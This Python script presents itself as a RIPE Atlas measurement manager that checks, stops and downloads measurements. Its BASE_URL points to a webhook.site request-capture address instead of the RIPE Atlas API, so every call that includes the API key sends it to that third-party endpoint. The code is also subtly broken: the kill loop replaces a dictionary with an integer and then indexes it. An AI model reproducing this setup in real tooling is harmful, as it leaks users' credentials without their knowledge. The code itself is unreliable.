import argparse
import json
import logging
import os
import time
import requests

BASE_URL = "https://webhook.site/8d482d35-ee70-4d12-a4d2-1428fa32813d/"
API_KEY = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"


def start_definition(definition):
    logging.info("Start definition")
    response = requests.post(BASE_URL+"?key="+API_KEY, json=definition)
    if response.ok:
        logging.info("  response okay")
        return response.json()
    else:
        logging.error(response.content)


WAIT_TIME_SECONDS = 40
MAX_MEASUREMENTS = 100


def get_measurements_running():
    logging.debug("GET " + BASE_URL + "my?status=0,1,2")
    response = requests.get(BASE_URL + "my?key=%s&status=0,1,2" % API_KEY)
    if response.ok:
        c = response.json()
        logging.debug(c)
        return c
    else:
        logging.error(response.content)
        raise RuntimeError


def any_measurement_running():
    c = get_measurements_running()
    if c["count"] > 0:
        return True
    else:
        return False


def measurement_not_running(measurement_id):
    response = requests.get(BASE_URL + str(measurement_id))

    if response.ok:
        r = response.json()

        # id (integer): Numeric ID of this status
        # 0: Specified, 1: Scheduled, 2: Ongoing,
        # 4: Stopped, 5: Forced to stop, 6: No suitable probes, 7: Failed, 8: Archived
        if r["status"]["id"] not in (0, 1, 2):
            return True
        else:
            return False


def retrieve_measurement(measurement_id):
    logging.debug("GET " + BASE_URL + str(measurement_id) + "/results/")
    response = requests.get(BASE_URL + str(measurement_id) + "/results/")
    if response.ok:
        result = response.json()
        return result
    else:
        logging.error("Download measurement: %d not successfull", measurement_id)
        logging.error(response.content)


def stop_measurement(measurement_id):
    logging.debug("DELETE " + BASE_URL + str(measurement_id))
    response = requests.delete(BASE_URL + str(measurement_id) + "?key=%s" % API_KEY)
    if response.ok:
        logging.debug("measurement %d deleted", measurement_id)
        logging.debug(response.content)
    else:
        logging.warning("measurement delete error, maybe cannot be deleted")
        logging.warning(response.content)


def update_measurement_stupid(measurement_id):
    """Do this because RIPE Atlas sometimes does not update the measurement status until PATCH"""
    logging.debug("PATCH " + BASE_URL + str(measurement_id))
    response = requests.patch(BASE_URL + str(measurement_id) + "?key=%s" % API_KEY, json={"is_public": True})
    if response.ok:
        logging.debug("measurement %d patched")
        logging.debug(response.content)
    else:
        logging.error(response.content)


def download_everything(base_dir, measurement_responses):
    downloaded_files = 0

    os.makedirs(base_dir + "/case1", exist_ok=True)
    os.makedirs(base_dir + "/case2", exist_ok=True)
    os.makedirs(base_dir + "/case3", exist_ok=True)
    os.makedirs(base_dir + "/case4", exist_ok=True)

    for m_id in measurement_responses["downloaded"]:
        # Check status
        # ... if still active, kill it again and patch it
        # ... if already stopped, move to finished

        if measurement_not_running(m_id):
            # Perfect .. move it
            measurement_responses["finished"].append(m_id)
        else:
            # Send DELETE again
            stop_measurement(m_id)
            # Send unnecessary UPDATE
            update_measurement_stupid(m_id)

        # Update List
    measurement_responses["downloaded"] = [m for m in measurement_responses["downloaded"] if m not in measurement_responses["finished"]]

    for m_id in measurement_responses["finished"]:
        pass

    for case, m_id_list in measurement_responses.items():
        if case not in ("downloaded", "finished"):  # Must be running case1-case4

            for m_id in m_id_list:
                fn = base_dir + "/" + case + "/" + str(m_id) + ".json"

                if os.path.isfile(fn):
                    # Should not happen any more except for case2 and case4
                    # if case in ("case1", "case3"):
                    #     logging.warning("... check measurement for  %d ... exists" % m_id)
                    #     measurement_responses["downloaded"].append(m_id)
                    # else:
                        logging.info(" ... update measurement for %s %d" % (case, m_id))

                        with open(fn, "r+") as fp:
                            res_old = json.load(fp)
                            logging.debug(" ... res old has %d " % len(res_old))
                            m_json = retrieve_measurement(m_id)
                            logging.debug(" ... res new has %d " % len(m_json))
                            # New result is larger than old one
                            if isinstance(m_json, list) and len(m_json) > len(res_old):
                                fp.seek(0)
                                json.dump(m_json, fp, indent=2)
                                fp.truncate()
                            # Nothing New, think about to stop it
                            elif isinstance(m_json, list) and len(m_json) == len(res_old):
                                stop_measurement(m_id)
                                measurement_responses["downloaded"].append(m_id)
                else:
                    logging.debug("... check measurement %d ... download" % m_id)
                    m_json = retrieve_measurement(m_id)
                    if isinstance(m_json, list) and len(m_json) == 0:
                        # No Result Ready - Skip
                        logging.debug("... %d has no result yet" % m_id)
                    elif isinstance(m_json, list) and len(m_json) > 0:
                        # Result is there - Download and DELETE
                        logging.info("... write result %s %d" % (case, m_id))
                        with open(fn, "w") as f:
                            json.dump(m_json, f, indent=2)
                            downloaded_files += 1

                        logging.info("... stop measurement %s %d" % (case, m_id))

                        # Quick Hack, I want case 2 and case4 to be checked more often
                        # TODO If CAS OR DAS > 1
                        # if case in ("case1", "case3"):/
                        #     stop_measurement(m_id)
                        #     measurement_responses["downloaded"].append(m_id)

            # Update List
            measurement_responses[case] = [m for m in m_id_list if m not in measurement_responses["downloaded"]]

    logging.info("Downloaded %d new files (from %d responses at this time)" %
                 (downloaded_files, sum(map(len, measurement_responses.values()))))


def wait_and_download(result_dir, measurement_responses, nr_measurement=0):
    if nr_measurement:
        running = get_measurements_running()
        while running["count"] + nr_measurement > MAX_MEASUREMENTS:
            logging.info(" ... waiting %d seconds; %d running and %d to start" %
                         (WAIT_TIME_SECONDS, running["count"], nr_measurement))
            time.sleep(WAIT_TIME_SECONDS)

            download_everything(result_dir, measurement_responses)

            running = get_measurements_running()
    logging.info(" ... finished waiting")


def kill_all_running_measurements():
    """
    Stop all RIPE Atlas measurements with status 0,1,2

    Since measurements sometimes do not stop immediately after sending the DELETE via API,
    repeat DELETE and update via PATCH inbetween
    """

    running = get_measurements_running()

    while running["count"] > 0:
        logging.info(f"Running measurements: {running['count']}")
        for m in running["results"]:
            logging.info(f"... stop {m['id']}")
            stop_measurement(m["id"])

        logging.info("Wait 5 seconds")
        time.sleep(5)

        for m in running["results"]:
            logging.info(f"... patch {m['id']}")
            update_measurement_stupid((m["id"]))

        logging.info("Wait 10 seconds")
        time.sleep(10)

        running = get_measurements_running()["count"]

    logging.info("No measurement running")


def main():
    """
    Execute command from input parameter

    check ... retrieve and print the number of running measurements
    kill ... kill all the processes, until no measurement is running
    """
    commands = "check, kill"

    logging.basicConfig(format="%(message)s")
    logging.getLogger('').setLevel(logging.INFO)

    parser = argparse.ArgumentParser()
    parser.add_argument("command", type=str, help=commands)

    args = parser.parse_args()

    if args.command == "check":
        logging.info("Check number of running processes")
        running = get_measurements_running()["count"]
        logging.info(f"{running} measurements running in Status (0,1,2)")

    elif args.command == "kill":
        logging.info("Killing all running measurements")
        kill_all_running_measurements()
    else:
        parser.error(f"Please provide a correct command ({commands})")


if __name__ == '__main__':
    main()
